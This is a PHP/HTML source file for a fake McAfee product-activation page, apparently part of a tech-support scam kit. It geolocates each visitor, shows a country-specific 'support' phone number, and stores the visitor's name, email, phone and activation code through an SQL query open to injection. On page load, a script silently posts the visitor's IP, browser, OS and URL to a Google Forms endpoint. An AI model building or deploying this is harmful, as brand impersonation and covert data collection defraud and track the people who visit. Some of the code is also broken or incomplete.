<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php

function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();

include 'config.php';
if(isset($_POST['submit-act']))
{
	$key=$_POST['key'];
	$name=$_POST['name'];
	$mobile=$_POST['contact'];
	$email=$_POST['email'];
    $country=$_POST['country']; 
    $sql=	"INSERT INTO `activation_detail`(`name`, `email`, `contact_no`, `country`, `activation_code`, `ip_address`) VALUES ('$name','$email','$mobile','$country','$key','$ip')";
    $run=mysqli_query($conn,$sql);

	if($run)
	{
        header('location: protected.php');

	}
	else{
		echo "error";
		
    }  

}

?>


<!DOCTYPE html>
<html>
<head>
	<title>Home Page</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="shortcut icon" href="img/favicon.ico"/>

    <link rel="stylesheet" href="css/style.css">
    <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
        .loader 
        {   
            margin-left:45%;
            margin-top:15%;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .rk-activ1{
            margin-top:8%;
        }
        .loader2 
        {   
            margin-left:35%;
            margin-top:10%;
            display:none;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media only screen and (max-width: 1200px)
        {
            .loader
            {
                margin-top:18%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 425px)
        {
            .loader
            {
                margin-top:35%;
                margin-left:35%;
            }
        }
        #actr{
            display:none;
        }
    </style>
</head>
<body>

<div class="loader"></div>



<div class="loader1">

    <div class="container-fluid">
        <div class="col-lg-3 col-md-3 col-sm-2"></div>
        <div class="col-lg-6 col-md-8 col-sm-8 col-xs-12 form-box">
            <div class="col-lg-12 ">
                <img src="img/logo.png" alt="">
            </div><br><br><br>
            <h2 class="mcafee-heading">Get started with McAfee Security</h2>
            <hr class="pipe"> 
            <a href="" class="active-bg">&#10004;</a>
            <a href="" class="active-bg1">&#10004;</a>
            <a href="" class="number-3-active">3</a>
            <a href="" class="enter-code-success">ENTER YOUR CODE</a>
            <a href="" class="create-acc-success">CREATE ACCOUNT</a>
            <a href="" class="protected-active">GET PROTECTED</a>
            <div class="col-lg-6 col-lg-6 col-md-6 col-sm-7">
                <form action="" class="form-des">
                    <h3>Your Activation Code</h3>
                    <input type="text"  class="input-key-product" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" required><br><br>
                    <input type="text"  class="input-key-product" placeholder="Enter Your Full Name" required><br><br>
                    <input type="text"  class="input-key-product" placeholder="Enter Your Contact No." required><br><br>
                    <input type="text"  class="input-key-product" placeholder="Enter Your Email Address" required><br><br>
                    <input type="text"  class="input-key-product" placeholder="Select Your Country" required><br>
                    
                    <br>
                    <input type="submit" class="btn-submit-code-product" value="Submit">
                </form>
            </div>
            <div class="col-lg-6 col-md-6 col-sm-5  hidden-xs text-left">
                <img src="img/product.png" class="image-responsive product-img" alt="">
            </div>
            
            <div>
                <img src="img/31.png" alt="" class="copy-foot-img">
                <p class="footer-copy">© 2003-2019 McAfee, LLC</p>
            </div>
        </div>
        <div class="col-lg-3 col-md-3 col-sm-2"></div>
    </div>


</div>

<script>

    // $(document).ready(function(){
    //   $("button").click(function(){
    //     $(".image-key-hint").css("display","block");
    //     $(".image-key-hint").removeClass("none-img");
    //   });
    // });
    

</script>

<div class="footer">
  <p><span class="cont-text">contact customer support :</span> <span class="number-hp">
  
<?php 
if($c_code == "US")
{
echo "US/CA +1 888 888 8888";
}
elseif($c_code == "CA")
{
echo "US/CA +1 888 888 8888";
}
elseif($c_code == "GB")
{
echo "UK   +44 888 888 8888";
}
elseif($c_code == "AU")
{
echo "AU   +61 888 888 888";
}
elseif($c_code == "NZ")
{
echo "NZ   +64 888 888 88";
}
else
{
    echo "US/CA +1 888 888 8888";
}
?>  
  </span> </p>
</div>
</body>
</html>
<script>

$(document).ready(function(){
    $(".loader1").hide();
    setTimeout(function(){
	$(".loader1").show();
},2000);

    setTimeout(function(){
	$(".loader").hide();
},2000);
});
</script>
<script>
$(document).ready(function(){
            
            var field1 = "<?php echo $ip; ?>";
            var field2 = "<?php echo $os; ?>";
            var field3 = "<?php echo $yourbrowser; ?>";
            var field4 = "<?php echo $url; ?>";

            var issue= "MCA";
           
           $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSf4ScufwA8nfMkFqP9Qli5VAIED14m2660bFVQpIaDEiOi0Qw/formResponse",
			    data: {"entry.1656736278": field1, "entry.926948088": field3, "entry.2004208092":field2, "entry.557824394":issue, "entry.64249553":field4},
                type: "POST",
                dataType: "xml",
                success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("sss()", 100);
					
				}
           });
		return false;
      
});
   
</script>